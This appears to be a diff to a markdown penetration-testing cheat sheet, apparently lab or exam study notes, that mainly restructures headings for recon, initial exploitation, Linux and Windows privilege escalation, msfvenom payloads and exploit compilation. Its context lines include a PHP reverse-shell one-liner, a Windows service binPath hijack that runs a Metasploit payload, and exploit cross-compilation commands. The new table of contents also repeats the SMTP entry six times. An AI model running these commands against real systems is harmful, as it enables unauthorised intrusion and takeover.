@@ -4,12 +4,22 @@
 [Services](#SERVICES)  
 * [FTP](#FTP---TCP-21)  
 * [SSH](#SSH---TCP-22)  
-* [HTTP](#HTTP---TCP080|8080|443|8443)
-* [FTP](#FTP---TCP-21)  
-* [FTP](#FTP---TCP-21)  
-[Recon](#RECON)  
-[Recon](#RECON)  
-[Recon](#RECON)  
+* [HTTP](#HTTP---TCP-80/8080/443/8443)
+* [Telnet](#Telnet---TCP-23)  
+* [SMTP](#SMTP---TCP-25)
+* [SMTP](#SMTP---TCP-25)
+* [SMTP](#SMTP---TCP-25)
+* [SMTP](#SMTP---TCP-25)
+* [SMTP](#SMTP---TCP-25)
+* [SMTP](#SMTP---TCP-25)
+
+[Web](#WEB)  
+[Initial Exploitation](#INITIAL-EXPLOITATION)  
+[Linux Privilege Escalation](#LINUX-PRIVESC)  
+[Windows Privilege Escalation](#WINDOWS-PRIVESC)  
+[Msfvenom Payloads](#MSFVENOM-PAYLODS)  
+[Compiling Exploit Code](#COMPILING-EXPLOIT-CODE)  
+[Other](#OTHER-THINGS)  
 
 
 # RECON
@@ -63,14 +73,11 @@ Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su roo
 
 See section "WEB" for juicy web stuff.
 
-
-
-__Telnet (TCP 23)__
+### Telnet---TCP-23
 
 Stuff
 
-
-__SMTP (TCP 25)__
+### SMTP---TCP-25
 
 SMTP enum tools
 ```bash
@@ -323,7 +330,7 @@ $ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 Apache
 * Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.
 
-## INITIAL EXPLOITATION
+# INITIAL EXPLOITATION
 
 Reverse shell cheatsheet:
 * http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
@@ -350,12 +357,7 @@ If reverse shell hangs / dies:
 * Try a bind shell instead of reverse shell.
 * Try generate a different payload with `msfvenom -p` or find another payload online.
 
-## KERNEL EXPLOITS
-
-FreeBSD 9.0
-* FreeBSD 9.0 - Intel SYSRET: https://www.exploit-db.com/exploits/28718
-
-## LINUX PRIVESC
+# LINUX PRIVESC
 
 Privilege escalation guides:
 * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)
@@ -408,7 +410,7 @@ Databases:
 * Check for presence of both MYSQL and MARIADB.
 * They may have two different types of databases to get creds / important info, so check for both.
 
-## WINDOWS PRIVESC
+# WINDOWS PRIVESC
 
 Windows privesc:
 * Automated scanner: https://github.com/azmatt/windowsEnum (automated)
@@ -516,12 +518,12 @@ sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" sta
 net start <vulnerable-service>
 ```
 
-## MSFVENOM PAYLOADS
+# MSFVENOM PAYLOADS
 
 Msfvenom commands:
 * https://netsec.ws/?p=331
 
-### COMPILING EXPLOIT CODE
+# COMPILING EXPLOIT CODE
 
 Compilation tips:
 * `./exploit` results in errors: compile in the host itself, Kali box or another machine.
@@ -536,7 +538,7 @@ $ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
 $ wine exploit.exe
 ```
 
-## OTHER THINGS
+# OTHER THINGS
 
 __Cracking Hashes__
 
